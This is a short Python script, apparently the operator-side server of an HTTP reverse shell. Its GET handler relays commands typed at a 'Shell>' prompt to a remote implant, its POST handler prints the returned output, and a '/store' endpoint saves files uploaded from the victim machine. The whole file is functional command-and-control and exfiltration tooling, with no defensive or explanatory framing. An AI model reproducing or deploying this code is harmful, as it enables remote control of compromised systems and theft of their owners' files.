import http.server
import os, cgi

HOST_NAME = '127.0.0.1'
PORT_NUMBER = 9001

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):

        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):


        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-] requisição POST inesperada')
                fs_up = fs['file']
                with open('/root/Desktop/place_holder.txt', 'wb') as o:
                    print('[+] Gravando os dados ..')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
                    print('[+] END ..')
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode('ISO-8859-1'))

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        print('[~] The server is listening')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print ('[!] Server is terminated')
        httpd.server_close()

